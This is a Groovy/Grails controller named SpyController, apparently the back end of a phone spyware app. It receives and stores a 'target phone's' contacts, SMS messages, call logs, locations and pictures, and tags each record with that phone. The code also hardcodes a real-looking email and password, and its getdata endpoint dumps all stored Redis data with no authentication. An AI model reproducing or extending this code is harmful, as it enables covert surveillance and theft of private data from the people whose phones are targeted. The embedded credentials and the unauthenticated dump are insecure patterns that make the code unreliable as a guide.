package com.xaviar

import static org.springframework.web.bind.annotation.RequestMethod.POST

import org.codehaus.jackson.JsonParseException
import org.codehaus.jackson.map.JsonMappingException
import org.codehaus.jackson.map.ObjectMapper
import org.codehaus.jackson.type.TypeReference

import redis.clients.jedis.Jedis

import com.org.krams.domain.UMetaData
import com.xaviar.domain.CallLog
import com.xaviar.domain.Contact
import com.xaviar.domain.FileData;
import com.xaviar.domain.Location
import com.xaviar.domain.PhoneParams
import com.xaviar.domain.Sms
import com.xaviar.domain.TargetPhone
import com.xaviar.domain.User
import com.xaviar.market.rest.item.DataHolder

class SpyController {

	def redisService
//	def contactService
//	def locationService
//	def smsService
	def userService
//	def callLogService
//	def phoneEventService
//	def smsEventService
//	def phoneParamsService

	def createdata(DataHolder dataHolder) {

		userService.initDammyUsers();

		// new user
		//dataHolder.data = '{"username":"username123","password":"password123","simSubscriberId":"3453453444"}';

		// old user
		dataHolder.data = '{"token":"token123","simSubscriberId":"425071021121744"}';

		String clientContacts = dataHolder.get(DataHolder.CONTACTS);
		String clientLocation = dataHolder.get(DataHolder.LOCATION);
		String clientSms = dataHolder.get(DataHolder.SMS);
		String clientCallLog = dataHolder.get(DataHolder.CALL_LOG);
		String clientPhoneEvent = dataHolder.get(DataHolder.PHONE_EVENT);
		String clientPhoneParams = dataHolder.get(DataHolder.PHONE_PARAMS);
		String clientSmsEvent = dataHolder.get(DataHolder.SMS_EVENT);
		String clientPics = dataHolder.get(DataHolder.BIN_ZIP_PICTURES);

		if (dataHolder.data != null) {

			Iterator<Map.Entry<String, String>> iterator = dataHolder.map.entrySet().iterator();
			while (iterator.hasNext()) {
				Map.Entry<String, String> mapEntry = (Map.Entry<String, String>) iterator
						.next();
				Jedis jedis = new Jedis("localhost");
				jedis.set("GENERIC_" + mapEntry.getKey().toString(), mapEntry.getValue()
						.toString());
			}

			try {
				ObjectMapper mapper = new ObjectMapper();
				UMetaData uMetaData = mapper.readValue(dataHolder.data,UMetaData.class);

				if(userService.authenticateUser(uMetaData)){
					if (clientPhoneParams != null) {
						mapper = new ObjectMapper();
						List<PhoneParams> phoneParams = mapper.readValue(clientPhoneParams,new TypeReference<List<PhoneParams>>() {
								});
						//PhoneParams.saveAll(phoneParams);
						//phoneParamsService.createAll(phoneParams,uMetaData);

						List<TargetPhone> targetPhones = mapper.readValue(clientPhoneParams,new TypeReference<List<TargetPhone>>() {
								});

						User user = new User();
						user.setUsername("eitan2007@gmail.com");
						user.setPassword("567567");
						user.setFirstName("eitan");
						user.setLastName("baron");
						user.version=1;
						user.save();

						def existingUser = User.findByUsernameAndPassword("eitan2007@gmail.com","567567");
						//TargetPhone.saveAll(phoneParams);
						//TargetPhone.findBy (user).saveAll(phoneParams);
						targetPhones.each{
							it.user=existingUser;
							it.save();
						}

					}


					TargetPhone  targetPhone = TargetPhone.findBySimSubscriberId(uMetaData.getSimSubscriberId());

					if (clientContacts != null) {
						mapper = new ObjectMapper();
						List<Contact> contacts = mapper.readValue(clientContacts,new TypeReference<List<Contact>>() {
								});
						contacts.each{
							it.targetPhone=targetPhone;
							it.save();
						}

						//Contact.saveAll(contacts);
						//contactService.createAll(contacts,uMetaData);
					}

					if (clientCallLog != null) {
						mapper = new ObjectMapper();
						List<CallLog> callLogs = mapper.readValue(clientCallLog,new TypeReference<List<CallLog>>() {
								});

						callLogs.each{ it.targetPhone=targetPhone;	it.save();						 }
						//CallLog.saveAll(callLogs);
						//callLogService.createAll(callLogs,uMetaData);
					}

					if (clientPhoneEvent != null) {
						mapper = new ObjectMapper();
						List<CallLog> phoneEvents = mapper.readValue(clientPhoneEvent,new TypeReference<List<CallLog>>() {
								});
						phoneEvents.each{ it.targetPhone=targetPhone;it.save(); }

						//CallLog.saveAll(phoneEvents);
						//phoneEventService.createAll(phoneEvents,uMetaData);
					}

					if (clientLocation != null) {
						mapper = new ObjectMapper();
						List<Location> locations = mapper.readValue(clientLocation,new TypeReference<List<Location>>() {
								});
						locations.each{ it.targetPhone=targetPhone; it.save();}
						//Location.saveAll(locations);
						//locationService.createAll(locations,uMetaData);
					}

					if (clientSms != null) {
						mapper = new ObjectMapper();
						List<Sms> smses = mapper.readValue(clientSms,new TypeReference<List<Sms>>() {
								});

						smses.each{
							it.targetPhone=targetPhone;
							it.save();
						}
						//Sms.saveAll(smses);
						//smsService.createAll(smses,uMetaData);
					}

					if (clientSmsEvent != null) {
						mapper = new ObjectMapper();
						List<Sms> smsEvents = mapper.readValue(clientSmsEvent,new TypeReference<List<Sms>>() {
								});
						smsEvents.each{ it.targetPhone=targetPhone;it.save(); }
						//Sms.saveAll(smsEvents);
						//smsEventService.createAll(smsEvents,uMetaData);
					}
					
					
					if (clientPics != null) {
						mapper = new ObjectMapper();
						List<FileData> clientPictures = mapper.readValue(clientPics,new TypeReference<List<FileData>>() {
								});
						clientPictures.each{it.save();}
						//Sms.saveAll(smsEvents);
						//smsEventService.createAll(smsEvents,uMetaData);
					}

				}

				final int id = 12;
				dataHolder.setID(id);

				[dataHolder:dataHolder]
			} catch (JsonParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (JsonMappingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	def getdata ={

		def DataHolder dataholder = new DataHolder();
		def Map<String, String> map = dataholder.getMap();
		def keys = redisService.withRedis { Jedis redis ->
			redis.keys("*");
		}

		for (key in keys) {
			def jsonData = redisService.withRedis { Jedis redis ->
				redis.get(key.toString());
			}

			if(jsonData!=null){
				map.put(key, jsonData);
			}
		}

		// print out data as json for test in the browser
		// render(contentType: 'text/json') {[dataholder:dataholder]}
		// also set urimappings.groovy action of getdata to GET :
		// action = [GET: "getdata"]

		[dataholder:dataholder]
	}
}
